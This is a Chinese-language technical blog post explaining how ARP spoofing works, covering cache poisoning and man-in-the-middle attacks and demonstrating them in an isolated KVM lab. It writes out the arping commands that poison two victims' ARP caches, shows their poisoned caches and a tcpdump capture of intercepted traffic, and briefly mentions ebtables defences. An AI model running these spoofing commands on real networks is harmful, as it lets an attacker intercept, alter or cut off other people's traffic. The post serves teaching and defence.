什么是arp spoofing ?
    ARP spoofing 是一种局域网攻击.它是用心险恶的(malicious)的角色在局域网发送伪造的(falsified)的ARP信息.该伪造ARP信息将攻击者的mac地址与局
域网某(一个或多个)合法的(legitimate)ip建立对应关系.一旦攻击者的MAC地址与真实的ip(受害者)建立连接,攻击者就开始接受原本应该发送给受害者ip的任
何数据.arp spoofing可以让攻击者在数据传输中拦截,修改,甚至阻拦数据.APR spoofing攻击只是局限于局域网中,因为局域网是需要arp进行ip->mac转换.

APR Spoofing 原理 ?
    伪装受害者的ip地址,使用自己的mac与受害者的ip发送arp reply,更新 局域网neigh机器的arp cache,建立攻击者mac与受害者ip在第三方机器arp cache
的对应关系；而第三方发送给受害者机器的数据帧,在局域网中(按mac寻址),则按攻击者的mac发送数据,数据被攻击者机器收到.

ARP Spoofing 常见攻击方式 ?
(1) ARP缓存投毒(ARP Cache Poisoning): 攻击者在局域网发送恶意的(包含受害者ip与错误mac)arp reply,更新neigh机器(s)的arp cache;导致原本应该发送
给受害者的数据帧按错误mac而无法找到受害者机器,导致受害者机器网络通信中断.
(2) 中间人攻击: 攻击者在局域网发送恶意的(包含受害者ip与错误mac)arp reply,更新neigh机器(s)的arp cache;例如告诉A,网关在攻击者机器这里;同时,又
欺骗网关,告诉网关A机器是攻击者所在机器;这样,网关原本应该发送给A机器的数据帧就按mac发送给了攻击者;同时,机器A出网关的数据包发送给了攻击者;这
样,攻击者在机器A与网关之间扮演中间人角色,可以拦截,修改数据包.

ARP Spoofing 攻击演示
演示前的准备工作:
在kvm虚拟化环境中创建3台测试机，并连接到某孤立的(不影响宿主网络)linux bridge上,构建简单的lan环境.
创建过程参考文章:《ip spoofing攻击原理解析与防护》
角色分配如下:
Hostname  Ip                  Role
---------------------------------------
node00    172.172.172.100     Attacker
node01    172.172.172.101     Victim01
node02    172.172.172.102     Victim02
---------------------------------------

在Attacker 机器上作如下设置:
# 允许arp包的源地址可以不是本机ip
[root@node00 ~] sysctl -w net.ipv4.ip_nonlocal_bind = 1
# 伪装为 172.172.172.101 告诉 172.172.172.102，自己的mac是 eth0设备的mac
[root@node00 ~] arping -A -I eth0 -s 172.172.172.101 172.172.172.102 &
# 伪装为 172.172.172.102 告诉 172.172.172.101，自己的mac是 eth0设备的mac
[root@node00 ~] arping -A -I eth0 -s 172.172.172.102 172.172.172.101 &

经过上述arp poisoning:
[root@node00 ~] ip -o link show eth0 | awk '{print $15}'
52:54:00:a3:7d:ad

(1)172.172.172.102的arp cache中保存 172.172.172.101 <Attacker MAC> 的对应关系;
[root@node02 ~] arp -a | grep 172.172.172.101
? (172.172.172.101) at 52:54:00:a3:7d:ad [ether] on eth0

(2)172.172.172.101的arp cache中保存 172.172.172.102 <Attacker MAC> 的对应关系;
[root@node01 ~] arp -a | grep 172.172.172.102
? (172.172.172.102) at 52:54:00:a3:7d:ad [ether] on eth0

然后在Attacker网卡(宿主下为 vnet0)抓包,发现victims之间的通信包被Attacker获取:
[root@node01 ~] curl 172.172.172.102

[root@my-pc ~]# tcpdump -i vnet0 port 80
tcpdump: WARNING: vnet0: no IPv4 address assigned
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on vnet0, link-type EN10MB (Ethernet), capture size 65535 bytes
01:21:39.226853 IP 172.172.172.101.36079 > 172.172.172.102.http: Flags [S], seq 3771044644, \
win 14600, options [mss 1460,sackOK,TS val 341742348 ecr 0,nop,wscale 7], length 0
01:21:40.436856 IP 172.172.172.101.36079 > 172.172.172.102.http: Flags [S], seq 3771044644, \
win 14600, options [mss 1460,sackOK,TS val 341743547 ecr 0,nop,wscale 7], length 0
01:21:42.458764 IP 172.172.172.101.36079 > 172.172.172.102.http: Flags [S], seq 3771044644, \
win 14600, options [mss 1460,sackOK,TS val 341745695 ecr 0,nop,wscale 7], length 0

虚拟化环境中对arp spoofing攻击的防御
# openstack 社区提交的补丁使用 ebtables 于VM端口处,以Ethernet frame level filtering rules处理arp spoofing


参考链接:
http://www.veracode.com/security/arp-spoofing
http://serverfault.com/questions/175803/how-to-broadcast-arp-update-to-all-neighbors-in-linux
http://specs.openstack.org/openstack/neutron-specs/specs/kilo/arp-spoof-filtering-ebtables.html
http://specs.openstack.org/openstack/neutron-specs/specs/kilo/arp-spoof-filtering-ebtables.html#proposed-change    # ebtables patch
http://www.fiec.espol.edu.ec/publicidades/2010/cd/DATA/papers/Preventing%20ARP%20Cache%20Poisoning%20Attacks%20A%20Proof%20of%20Con\
cept%20using%20OpenWrt.pdf
http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/Understanding-Man-in-the-Middle-Attacks-ARP-Part1.html
https://www.ibm.com/support/knowledgecenter/linuxonibm/liaai.vswitch/liaaivswitchnospoof.htm  # ibm的no-arp-spoofing方案
令参考 arping man手册
